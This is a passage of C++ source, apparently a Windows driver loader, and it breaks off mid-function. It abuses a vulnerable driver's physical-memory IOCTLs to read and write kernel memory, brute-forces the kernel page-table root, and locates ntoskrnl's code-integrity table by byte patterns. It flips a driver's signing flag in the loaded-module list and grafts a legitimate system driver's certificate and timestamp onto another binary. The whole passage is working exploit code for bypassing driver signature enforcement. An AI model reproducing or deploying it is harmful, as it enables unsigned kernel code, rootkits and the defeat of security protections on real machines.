    io.PhysicalAddress.QuadPart = static_cast<LONGLONG>(physAddr);
    IO_STATUS_BLOCK ios = {};
    NTSTATUS st = s_NtDeviceIoControlFile(dev, nullptr, nullptr, nullptr, &ios,
        DL_IOCTL_MAP, &io, sizeof(io), &io, sizeof(io));
    if (NT_SUCCESS(st) && io.MappedAddress) { *mapped = io.MappedAddress; CacheMapResult(io); }
    else if (NT_SUCCESS(st)) st = STATUS_UNSUCCESSFUL;
    return st;
}

static NTSTATUS VulnUnmapPhysicalMemory(HANDLE dev, PVOID mapped)
{
    if (dev == nullptr || dev == INVALID_HANDLE_VALUE) return STATUS_INVALID_HANDLE;
    if (!mapped) return STATUS_INVALID_PARAMETER;
    DL_WINIO_PHYS_MEM io = {};
    DL_WINIO_PHYS_MEM* c = FindCachedMap(mapped);
    if (c) { io = *c; } else { io.MappedAddress = mapped; }
    IO_STATUS_BLOCK ios = {};
    NTSTATUS st = s_NtDeviceIoControlFile(dev, nullptr, nullptr, nullptr, &ios,
        DL_IOCTL_UNMAP, &io, sizeof(io), &io, sizeof(io));
    RemoveCachedMap(mapped);
    return st;
}

static NTSTATUS VulnReadPhysicalMemory(HANDLE dev, ULONGLONG physAddr, PVOID buf, SIZE_T sz)
{
    if (!buf || sz == 0) return STATUS_INVALID_PARAMETER;
    PVOID mapped = nullptr;
    ULONG mapSz = static_cast<ULONG>((sz + 0xFFF) & ~0xFFF);
    NTSTATUS st = VulnMapPhysicalMemory(dev, physAddr & ~0xFFFULL, mapSz, &mapped);
    if (!NT_SUCCESS(st)) return st;
    __try {
        ULONG off = static_cast<ULONG>(physAddr & 0xFFF);
        memcpy(buf, (PUCHAR)mapped + off, sz);
        _mm_mfence(); _mm_lfence();
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        VulnUnmapPhysicalMemory(dev, mapped);
        return STATUS_ACCESS_VIOLATION;
    }
    VulnUnmapPhysicalMemory(dev, mapped);
    return STATUS_SUCCESS;
}

static NTSTATUS VulnWritePhysicalMemory(HANDLE dev, ULONGLONG physAddr, PVOID data, SIZE_T sz)
{
    if (!data || sz == 0) return STATUS_INVALID_PARAMETER;
    PVOID mapped = nullptr;
    ULONG mapSz = static_cast<ULONG>((sz + 0xFFF) & ~0xFFF);
    NTSTATUS st = VulnMapPhysicalMemory(dev, physAddr & ~0xFFFULL, mapSz, &mapped);
    if (!NT_SUCCESS(st)) return st;
    __try {
        ULONG off = static_cast<ULONG>(physAddr & 0xFFF);
        memcpy((PUCHAR)mapped + off, data, sz);
        _mm_mfence(); _mm_lfence();
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        VulnUnmapPhysicalMemory(dev, mapped);
        return STATUS_ACCESS_VIOLATION;
    }
    VulnUnmapPhysicalMemory(dev, mapped);
    return STATUS_SUCCESS;
}


static ULONGLONG VulnVirtualToPhysical(HANDLE dev, PVOID va);

static NTSTATUS VulnReadKernelMemory(HANDLE dev, PVOID address, PVOID buf, SIZE_T sz)
{
    if (dev == nullptr || dev == INVALID_HANDLE_VALUE) return STATUS_INVALID_HANDLE;
    if (!buf || sz == 0) return STATUS_INVALID_PARAMETER;
    ULONGLONG va = reinterpret_cast<ULONGLONG>(address);
    PUCHAR out = static_cast<PUCHAR>(buf);
    SIZE_T rem = sz;
    while (rem > 0) {
        ULONGLONG po = va & 0xFFF;
        SIZE_T chunk = (std::min)(rem, 0x1000 - static_cast<SIZE_T>(po));
        ULONGLONG pa = VulnVirtualToPhysical(dev, reinterpret_cast<PVOID>(va));
        if (pa == 0) return STATUS_UNSUCCESSFUL;
        NTSTATUS st = VulnReadPhysicalMemory(dev, pa, out, chunk);
        if (!NT_SUCCESS(st)) return st;
        va += chunk; out += chunk; rem -= chunk;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS VulnWriteKernelMemory(HANDLE dev, PVOID address, PVOID data, SIZE_T sz)
{
    if (dev == nullptr || dev == INVALID_HANDLE_VALUE) return STATUS_INVALID_HANDLE;
    if (!data || sz == 0) return STATUS_INVALID_PARAMETER;
    ULONGLONG va = reinterpret_cast<ULONGLONG>(address);
    PUCHAR in = static_cast<PUCHAR>(data);
    SIZE_T rem = sz;
    while (rem > 0) {
        ULONGLONG po = va & 0xFFF;
        SIZE_T chunk = (std::min)(rem, 0x1000 - static_cast<SIZE_T>(po));
        ULONGLONG pa = VulnVirtualToPhysical(dev, reinterpret_cast<PVOID>(va));
        if (pa == 0) return STATUS_UNSUCCESSFUL;
        NTSTATUS st = VulnWritePhysicalMemory(dev, pa, in, chunk);
        if (!NT_SUCCESS(st)) return st;
        va += chunk; in += chunk; rem -= chunk;
    }
    return STATUS_SUCCESS;
}


static ULONGLONG s_KernelCR3    = 0;
static ULONGLONG s_NtoskrnlBase = 0;


static PVOID GetKernelModuleBase(const char* moduleName);
static PVOID GetKernelProcAddress(PVOID moduleBase, const char* procName);

static ULONGLONG V2PWithCR3(HANDLE dev, ULONGLONG cr3, ULONGLONG va)
{
    ULONGLONG pml4e = 0;
    if (!NT_SUCCESS(VulnReadPhysicalMemory(dev, cr3 + ((va >> 39) & 0x1FF) * 8, &pml4e, 8))) return 0;
    if (!(pml4e & 1)) return 0;
    ULONGLONG pdpte = 0;
    if (!NT_SUCCESS(VulnReadPhysicalMemory(dev, (pml4e & 0xFFFFFFFFF000ULL) + ((va >> 30) & 0x1FF) * 8, &pdpte, 8))) return 0;
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0xFFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
    ULONGLONG pde = 0;
    if (!NT_SUCCESS(VulnReadPhysicalMemory(dev, (pdpte & 0xFFFFFFFFF000ULL) + ((va >> 21) & 0x1FF) * 8, &pde, 8))) return 0;
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0xFFFFFFFE00000ULL) + (va & 0x1FFFFF);
    ULONGLONG pte = 0;
    if (!NT_SUCCESS(VulnReadPhysicalMemory(dev, (pde & 0xFFFFFFFFF000ULL) + ((va >> 12) & 0x1FF) * 8, &pte, 8))) return 0;
    if (!(pte & 1)) return 0;
    return (pte & 0xFFFFFFFFF000ULL) + (va & 0xFFF);
}

static BOOL VerifyCR3Candidate(HANDLE dev, ULONGLONG cr3, ULONGLONG ntVA)
{
    if (ntVA == 0) return FALSE;
    ULONGLONG pa = V2PWithCR3(dev, cr3, ntVA);
    if (pa == 0) return FALSE;
    UCHAR mz[2] = {};
    if (!NT_SUCCESS(VulnReadPhysicalMemory(dev, pa, mz, 2))) return FALSE;
    return (mz[0] == 0x4D && mz[1] == 0x5A);
}

static ULONGLONG GetKernelCR3(HANDLE dev, ULONGLONG ntBase)
{
    PVOID pPsInit = GetKernelProcAddress((PVOID)ntBase, "PsInitialSystemProcess");
    if (!pPsInit) return 0;

    static const ULONGLONG lowCR3[] = {
        0x1AD000, 0x1AB000, 0x1A9000, 0x1A7000,
        0x1B0000, 0x1B2000, 0x1B4000, 0x1B6000,
        0x100000, 0x102000, 0x104000, 0x106000,
        0x180000, 0x182000, 0x184000, 0x186000,
        0x200000, 0x202000, 0x204000, 0x206000,
        0x300000, 0x400000, 0x500000, 0x600000
    };

    auto tryCandidate = [&](ULONGLONG testCR3) -> ULONGLONG {
        ULONGLONG physPsInit = V2PWithCR3(dev, testCR3, (ULONGLONG)pPsInit);
        if (physPsInit == 0) return 0;
        ULONGLONG sysEproc = 0;
        if (!NT_SUCCESS(VulnReadPhysicalMemory(dev, physPsInit, &sysEproc, 8))) return 0;
        if (sysEproc == 0 || (sysEproc & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) return 0;
        ULONGLONG physEproc = V2PWithCR3(dev, testCR3, sysEproc);
        if (physEproc == 0) return 0;
        ULONGLONG dtb = 0;
        if (!NT_SUCCESS(VulnReadPhysicalMemory(dev, physEproc + 0x28, &dtb, 8))) return 0;
        dtb &= ~0xFFFULL;
        if (dtb == 0 || dtb > 0x800000000ULL) return 0;
        if (VerifyCR3Candidate(dev, dtb, ntBase)) return dtb;
        return 0;
    };

    for (int i = 0; i < _countof(lowCR3); i++) {
        ULONGLONG r = tryCandidate(lowCR3[i]);
        if (r) return r;
    }
    for (ULONGLONG t = 0x100000; t < 0x10000000; t += 0x1000) {
        ULONGLONG r = tryCandidate(t);
        if (r) return r;
    }
    return 0;
}

static ULONGLONG VulnVirtualToPhysical(HANDLE dev, PVOID va)
{
    if (s_KernelCR3 == 0) {
        if (s_NtoskrnlBase == 0)
            s_NtoskrnlBase = (ULONGLONG)GetKernelModuleBase("ntoskrnl.exe");
        s_KernelCR3 = GetKernelCR3(dev, s_NtoskrnlBase);
        if (s_KernelCR3 == 0) return 0;
    }
    return V2PWithCR3(dev, s_KernelCR3, (ULONGLONG)va);
}


static PVOID GetKernelModuleBase(const char* moduleName)
{
    if (!s_NtQuerySystemInformation) return nullptr;
    ULONG retLen = 0;
    NTSTATUS st = s_NtQuerySystemInformation(11, nullptr, 0, &retLen);
    PVOID buf = nullptr;
    while (st == STATUS_INFO_LENGTH_MISMATCH) {
        if (buf) VirtualFree(buf, 0, MEM_RELEASE);
        buf = VirtualAlloc(nullptr, retLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) return nullptr;
        st = s_NtQuerySystemInformation(11, buf, retLen, &retLen);
    }
    if (!NT_SUCCESS(st)) { if (buf) VirtualFree(buf, 0, MEM_RELEASE); return nullptr; }

    DL_RTL_PROCESS_MODULES* mi = reinterpret_cast<DL_RTL_PROCESS_MODULES*>(buf);
    PVOID result = nullptr;
    for (ULONG i = 0; i < mi->NumberOfModules; i++) {
        auto& m = mi->Modules[i];
        const char* n = reinterpret_cast<const char*>(m.FullPathName + m.OffsetToFileName);
        if (_stricmp(n, moduleName) == 0) { result = m.ImageBase; break; }
    }
    VirtualFree(buf, 0, MEM_RELEASE);


    if (!result && _stricmp(moduleName, "ntoskrnl.exe") == 0) {
        LPVOID drivers[1024];
        DWORD cb = 0;
        if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) {
            if (cb >= sizeof(LPVOID) && drivers[0]) result = drivers[0];
        }
    }
    return result;
}

static PVOID GetKernelProcAddress(PVOID moduleBase, const char* procName)
{
    HMODULE local = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!local) return nullptr;
    PVOID localProc = GetProcAddress(local, procName);
    if (!localProc) { FreeLibrary(local); return nullptr; }
    ULONG_PTR off = reinterpret_cast<ULONG_PTR>(localProc) - reinterpret_cast<ULONG_PTR>(local);
    FreeLibrary(local);
    return reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(moduleBase) + off);
}

struct WindowsVersion { DWORD major, minor, build; bool isWin11; };

static WindowsVersion GetWindowsVersion()
{
    WindowsVersion v = {};
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return v;
    auto fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
    if (!fn) return v;
    RTL_OSVERSIONINFOW ovi = {}; ovi.dwOSVersionInfoSize = sizeof(ovi);
    if (fn(&ovi) == 0) {
        v.major = ovi.dwMajorVersion; v.minor = ovi.dwMinorVersion;
        v.build = ovi.dwBuildNumber;
        v.isWin11 = (v.major >= 10 && v.build >= 22000);
    }
    return v;
}

static BOOL GetCiValidateImageHeaderEntry(PVOID* outCi, PVOID* outZwFlush)
{
    WindowsVersion wv = GetWindowsVersion();

    PVOID ntBase = GetKernelModuleBase("ntoskrnl.exe");
    if (!ntBase) { return FALSE; }

    HMODULE localMod = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!localMod) { return FALSE; }

    MODULEINFO mi = {};
    if (!K32GetModuleInformation(GetCurrentProcess(), localMod, &mi, sizeof(mi))) {
        FreeLibrary(localMod); return FALSE;
    }

    struct CiPat { BYTE bytes[16]; DWORD len; DWORD leaOff; const char* name; };

    CiPat win10Pats[] = {
        { { 0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 7, 4, "W10 lea r8 rdx=rbx" },
        { { 0xFF, 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 7, 4, "W10 lea r8 rcx=rbx" },
    };
    CiPat win11Pats[] = {
        { { 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0D }, 9, 6, "W11 25H2 lea r9" },
    };
    CiPat univPats[] = {
        { { 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 6, 3, "Univ lea r8 rdx=rbx" },
        { { 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 6, 3, "Univ lea r8 rcx=rbx" },
        { { 0x4C, 0x8D, 0x0D }, 3, 0, "Univ lea r9" },
    };

    BYTE* searchBase = reinterpret_cast<BYTE*>(localMod);
    BYTE* foundAddr = nullptr;
    const char* matchedPat = nullptr;

    auto searchPattern = [&](CiPat* pats, int cnt) -> bool {
        for (int p = 0; p < cnt; p++) {
            CiPat& pat = pats[p];
            for (DWORD off = 0; off < mi.SizeOfImage - pat.len; off++) {
                bool match = true;
                for (DWORD j = 0; j < pat.len; j++) {
                    if (searchBase[off + j] != pat.bytes[j]) { match = false; break; }
                }
                if (match) {
                    BYTE* la = searchBase + off + pat.leaOff;
                    INT32 lo = *reinterpret_cast<INT32*>(la + 3);
                    ULONG_PTR ta = reinterpret_cast<ULONG_PTR>(la) + 7 + static_cast<INT64>(lo);
                    ULONG_PTR to2 = ta - reinterpret_cast<ULONG_PTR>(localMod);
                    if (to2 < mi.SizeOfImage) {
                        if (pat.len <= 3) {
                            if (to2 > mi.SizeOfImage / 2) {
                                DWORD* td = reinterpret_cast<DWORD*>(ta);
                                if (*td == 256 || *td == 0 || *td >= 100) {
                                    foundAddr = la; matchedPat = pat.name; return true;
                                }
                            }
                        } else {
                            foundAddr = la; matchedPat = pat.name; return true;
                        }
                    }
                }
            }
        }
        return false;
    };

    bool found = false;
    if (wv.isWin11) {
        found = searchPattern(win11Pats, _countof(win11Pats));
        if (!found) found = searchPattern(win10Pats, _countof(win10Pats));
    } else {
        found = searchPattern(win10Pats, _countof(win10Pats));
        if (!found) found = searchPattern(win11Pats, _countof(win11Pats));
    }
    if (!found) found = searchPattern(univPats, _countof(univPats));

    if (!foundAddr) {
        FreeLibrary(localMod); return FALSE;
    }

    INT32 leaOffset = *reinterpret_cast<INT32*>(foundAddr + 3);
    ULONG_PTR seCiLocal = reinterpret_cast<ULONG_PTR>(foundAddr) + 7 + static_cast<INT64>(leaOffset);
    ULONG_PTR kernOff = seCiLocal - reinterpret_cast<ULONG_PTR>(localMod);
    if (kernOff >= mi.SizeOfImage) { FreeLibrary(localMod); return FALSE; }

    PVOID seCiKernel = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ntBase) + kernOff);

    PVOID zwFlushLocal = GetProcAddress(localMod, "ZwFlushInstructionCache");
    if (!zwFlushLocal) { FreeLibrary(localMod); return FALSE; }
    PVOID zwFlushKernel = reinterpret_cast<PVOID>(
        reinterpret_cast<ULONG_PTR>(zwFlushLocal) - reinterpret_cast<ULONG_PTR>(localMod) +
        reinterpret_cast<ULONG_PTR>(ntBase));

    PVOID ciEntry = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(seCiKernel) + 0x20);
    FreeLibrary(localMod);

    if (outCi)      *outCi      = ciEntry;
    if (outZwFlush) *outZwFlush = zwFlushKernel;
    return TRUE;
}

static BOOL PatchDriverSigningFlags(HANDLE dev, PCWSTR driverFileName)
{
    char narrowName[256] = {};
    WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, narrowName, sizeof(narrowName), NULL, NULL);

    PVOID driverBase = nullptr;
    {
        ULONG retLen = 0;
        s_NtQuerySystemInformation(11, nullptr, 0, &retLen);
        if (retLen == 0) return FALSE;
        PVOID buf = VirtualAlloc(nullptr, retLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) return FALSE;
        if (NT_SUCCESS(s_NtQuerySystemInformation(11, buf, retLen, &retLen))) {
            DL_RTL_PROCESS_MODULES* mi = reinterpret_cast<DL_RTL_PROCESS_MODULES*>(buf);
            for (ULONG i = 0; i < mi->NumberOfModules; i++) {
                const char* n = reinterpret_cast<const char*>(
                    mi->Modules[i].FullPathName + mi->Modules[i].OffsetToFileName);
                if (_stricmp(n, narrowName) == 0) { driverBase = mi->Modules[i].ImageBase; break; }
            }
        }
        VirtualFree(buf, 0, MEM_RELEASE);
    }
    if (!driverBase) { return FALSE; }

    HMODULE localNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!localNtos) return FALSE;
    PVOID localPsLML = GetProcAddress(localNtos, "PsLoadedModuleList");
    if (!localPsLML) { FreeLibrary(localNtos); return FALSE; }
    PVOID ntBase = GetKernelModuleBase("ntoskrnl.exe");
    if (!ntBase) { FreeLibrary(localNtos); return FALSE; }
    ULONG_PTR pmlOff = reinterpret_cast<ULONG_PTR>(localPsLML) - reinterpret_cast<ULONG_PTR>(localNtos);
    FreeLibrary(localNtos);
    PVOID pPsLML = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ntBase) + pmlOff);

    ULONG_PTR listFlink = 0;
    if (!NT_SUCCESS(VulnReadKernelMemory(dev, pPsLML, &listFlink, sizeof(listFlink))) || !listFlink)
        return FALSE;

    ULONG_PTR headAddr = reinterpret_cast<ULONG_PTR>(pPsLML);
    ULONG_PTR cur = listFlink;

    for (int i = 0; i < 1024 && cur != headAddr; i++) {
        PVOID entryBase = nullptr;
        if (!NT_SUCCESS(VulnReadKernelMemory(dev, reinterpret_cast<PVOID>(cur + 0x30), &entryBase, sizeof(entryBase))))
            break;
        if (entryBase == driverBase) {
            DWORD flags = 0;
            VulnReadKernelMemory(dev, reinterpret_cast<PVOID>(cur + 0x68), &flags, sizeof(flags));
            flags |= 0x20;
            if (!NT_SUCCESS(VulnWriteKernelMemory(dev, reinterpret_cast<PVOID>(cur + 0x68), &flags, sizeof(flags))))
                return FALSE;
            DWORD verify = 0;
            VulnReadKernelMemory(dev, reinterpret_cast<PVOID>(cur + 0x68), &verify, sizeof(verify));
            s_DriverLoadAddress = driverBase;
            s_PatchedFlags = verify;
            s_KernelSigningVerified = (verify & 0x20) != 0;
            return TRUE;
        }
        ULONG_PTR nxt = 0;
        VulnReadKernelMemory(dev, reinterpret_cast<PVOID>(cur), &nxt, sizeof(nxt));
        if (!nxt || nxt == cur) break;
        cur = nxt;
    }
    return FALSE;
}


struct DL_CERT_BUFFER { BYTE* Data; DWORD Size; };

static BOOL ExtractCertificateData(LPCWSTR filePath, DL_CERT_BUFFER* out)
{
    if (!filePath || !out) return FALSE;
    out->Data = nullptr; out->Size = 0;
    HANDLE hf = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    DWORD fsz = GetFileSize(hf, nullptr);
    if (fsz == INVALID_FILE_SIZE || fsz < 4096) { CloseHandle(hf); return FALSE; }
    BYTE* fd = (BYTE*)VirtualAlloc(nullptr, fsz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fd) { CloseHandle(hf); return FALSE; }
    DWORD br = 0;
    if (!ReadFile(hf, fd, fsz, &br, nullptr) || br != fsz) {
        VirtualFree(fd, 0, MEM_RELEASE); CloseHandle(hf); return FALSE;
    }
    CloseHandle(hf);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fd;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { VirtualFree(fd, 0, MEM_RELEASE); return FALSE; }
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > fsz) { VirtualFree(fd, 0, MEM_RELEASE); return FALSE; }
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)(fd + dos->e_lfanew);
    if (nth->Signature != IMAGE_NT_SIGNATURE) { VirtualFree(fd, 0, MEM_RELEASE); return FALSE; }

    IMAGE_DATA_DIRECTORY secDir = {};
    if (nth->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
        PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)nth;
        if (nt64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) { VirtualFree(fd, 0, MEM_RELEASE); return FALSE; }
        secDir = nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    } else {
        VirtualFree(fd, 0, MEM_RELEASE); return FALSE;
    }
    if (secDir.VirtualAddress == 0 || secDir.Size < sizeof(WIN_CERTIFICATE) ||
        secDir.VirtualAddress + secDir.Size > fsz) { VirtualFree(fd, 0, MEM_RELEASE); return FALSE; }

    out->Data = (BYTE*)VirtualAlloc(nullptr, secDir.Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!out->Data) { VirtualFree(fd, 0, MEM_RELEASE); return FALSE; }
    memcpy(out->Data, fd + secDir.VirtualAddress, secDir.Size);
    out->Size = secDir.Size;
    VirtualFree(fd, 0, MEM_RELEASE);
    return TRUE;
}

static DWORD ComputePEChecksum(BYTE* pe, DWORD sz)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe;
    PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)(pe + dos->e_lfanew);
    DWORD csOff = (DWORD)((BYTE*)&nt64->OptionalHeader.CheckSum - pe);
    DWORD csW1 = csOff / 2, csW2 = csW1 + 1;
    DWORD wc = sz / 2;
    USHORT* ptr = (USHORT*)pe;
    ULONGLONG sum = 0;
    for (DWORD i = 0; i < wc; i++) {
        if (i == csW1 || i == csW2) continue;
        sum += ptr[i]; sum = (sum & 0xFFFF) + (sum >> 16);
    }
    if (sz & 1) { sum += pe[sz - 1]; sum = (sum & 0xFFFF) + (sum >> 16); }
    sum = (sum & 0xFFFF) + (sum >> 16);
    sum += sz;
    return (DWORD)sum;
}

static int ScoreDriverCert(LPCWSTR filePath)
{
    int score = 1;
    WINTRUST_FILE_INFO fi = {}; fi.cbStruct = sizeof(fi); fi.pcwszFilePath = filePath;
    GUID ag = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    WINTRUST_DATA td = {}; td.cbStruct = sizeof(td);
    td.dwUIChoice = WTD_UI_NONE; td.fdwRevocationChecks = WTD_REVOKE_NONE;
    td.dwUnionChoice = WTD_CHOICE_FILE; td.pFile = &fi;
    td.dwStateAction = WTD_STATEACTION_VERIFY;
    td.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
    LONG ls = WinVerifyTrust(NULL, &ag, &td);
    if (ls == ERROR_SUCCESS) score += 200;
    else if (ls == (LONG)CERT_E_EXPIRED) score += 50;

    if (td.hWVTStateData) {
        CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(td.hWVTStateData);
        if (prov) {
            CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
            if (sgnr) {
                if (sgnr->csCounterSigners > 0) score += 50;
                if (sgnr->pChainContext && sgnr->pChainContext->cChain > 0) {
                    CERT_SIMPLE_CHAIN* ch = sgnr->pChainContext->rgpChain[0];
                    if (ch->cElement > 0) {
                        PCCERT_CONTEXT leaf = ch->rgpElement[0]->pCertContext;
                        SYSTEMTIME st2; FileTimeToSystemTime(&leaf->pCertInfo->NotAfter, &st2);
                        if (st2.wYear >= 2027) score += 200;
                        else if (st2.wYear >= 2026) score += 150;
                        else if (st2.wYear >= 2025) score += 100;
                    }
                }
            }
        }
    }
    td.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &ag, &td);
    return score;
}

static BOOL FindSignedDonorDriver(WCHAR* out, SIZE_T outCh)
{
    int bestScore = 0;
    WCHAR sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);


    const wchar_t* fast_targets[] = {
        L"\\drivers\\tcpip.sys",
        L"\\drivers\\ntfs.sys",
        L"\\drivers\\ndis.sys",
        L"\\drivers\\fltmgr.sys",
        L"\\drivers\\dxgkrnl.sys",
        L"\\drivers\\netio.sys",
        L"\\ntoskrnl.exe"
    };

    for (int i = 0; i < _countof(fast_targets); i++) {
        WCHAR path[MAX_PATH];
        wcscpy_s(path, sysDir);
        wcscat_s(path, fast_targets[i]);

        if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES) {
            int sc = ScoreDriverCert(path);
            if (sc > bestScore) {
                bestScore = sc;
                wcscpy_s(out, outCh, path);
                if (sc >= 1000) return TRUE;
            }
        }
    }


    if (bestScore < 1000) {
        WCHAR dd[MAX_PATH]; wcscpy_s(dd, sysDir); wcscat_s(dd, L"\\drivers");
        WIN32_FIND_DATAW fd;
        WCHAR sp[MAX_PATH]; wcscpy_s(sp, dd); wcscat_s(sp, L"\\*.sys");
        HANDLE hf = FindFirstFileW(sp, &fd);
        if (hf != INVALID_HANDLE_VALUE) {
            int count = 0;
            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                if (fd.nFileSizeLow < 8192) continue;
                WCHAR fp[MAX_PATH]; wcscpy_s(fp, dd); wcscat_s(fp, L"\\"); wcscat_s(fp, fd.cFileName);


                HANDLE h = CreateFileW(fp, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
                if (h == INVALID_HANDLE_VALUE) continue;
                BYTE hdr[4096]; DWORD br2 = 0;
                BOOL ok = ReadFile(h, hdr, sizeof(hdr), &br2, nullptr);
                CloseHandle(h);
                if (!ok || br2 < sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) continue;
                PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)hdr;
                if (d->e_magic != IMAGE_DOS_SIGNATURE) continue;

                int sc = ScoreDriverCert(fp);
                if (sc > bestScore) {
                    bestScore = sc;
                    wcscpy_s(out, outCh, fp);
                    if (sc >= 1000) break;
                }
                if (++count >= 20) break;
            } while (FindNextFileW(hf, &fd));
            FindClose(hf);
        }
    }

    return (bestScore > 0);
}

static BOOL TransplantCertificate(LPCWSTR targetPath)
{
    WCHAR donorPath[MAX_PATH] = {};
    if (!FindSignedDonorDriver(donorPath, MAX_PATH)) {
        return FALSE;
    }

    DL_CERT_BUFFER cert = {};
    if (!ExtractCertificateData(donorPath, &cert)) { return FALSE; }

    DWORD donorTDS = 0;
    FILETIME donorC = {}, donorA = {}, donorW = {};
    {
        HANDLE hd = CreateFileW(donorPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hd != INVALID_HANDLE_VALUE) {
            GetFileTime(hd, &donorC, &donorA, &donorW);
            BYTE dh[4096]; DWORD dbr = 0;
            if (ReadFile(hd, dh, sizeof(dh), &dbr, nullptr) &&
                dbr >= sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) {
                PIMAGE_DOS_HEADER dd2 = (PIMAGE_DOS_HEADER)dh;
                if (dd2->e_magic == IMAGE_DOS_SIGNATURE &&
                    (DWORD)dd2->e_lfanew + sizeof(IMAGE_NT_HEADERS64) <= dbr) {
                    PIMAGE_NT_HEADERS dn = (PIMAGE_NT_HEADERS)(dh + dd2->e_lfanew);
                    if (dn->Signature == IMAGE_NT_SIGNATURE) donorTDS = dn->FileHeader.TimeDateStamp;
                }
            }
            CloseHandle(hd);
        }
    }

    HANDLE ht = CreateFileW(targetPath, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (ht == INVALID_HANDLE_VALUE) {
        VirtualFree(cert.Data, 0, MEM_RELEASE); return FALSE;
    }
    DWORD tsz = GetFileSize(ht, nullptr);
    if (tsz == INVALID_FILE_SIZE || tsz < 4096) { CloseHandle(ht); VirtualFree(cert.Data, 0, MEM_RELEASE); return FALSE; }

    DWORD certOff = (tsz + 7) & ~7UL;
    DWORD finalSz = certOff + cert.Size;
    BYTE* final2 = (BYTE*)VirtualAlloc(nullptr, finalSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!final2) { CloseHandle(ht); VirtualFree(cert.Data, 0, MEM_RELEASE); return FALSE; }

    DWORD br3 = 0;
    if (!ReadFile(ht, final2, tsz, &br3, nullptr) || br3 != tsz) {
        CloseHandle(ht); VirtualFree(final2, 0, MEM_RELEASE);
        VirtualFree(cert.Data, 0, MEM_RELEASE); return FALSE;
    }
    CloseHandle(ht);

    PIMAGE_NT_HEADERS64 tnt = (PIMAGE_NT_HEADERS64)(final2 + ((PIMAGE_DOS_HEADER)final2)->e_lfanew);
    if (donorTDS) tnt->FileHeader.TimeDateStamp = donorTDS;
    tnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = certOff;
    tnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = cert.Size;
    tnt->OptionalHeader.CheckSum = 0;
    if (certOff > tsz) memset(final2 + tsz, 0, certOff - tsz);
    memcpy(final2 + certOff, cert.Data, cert.Size);
    VirtualFree(cert.Data, 0, MEM_RELEASE);
    tnt->OptionalHeader.CheckSum = ComputePEChecksum(final2, finalSz);

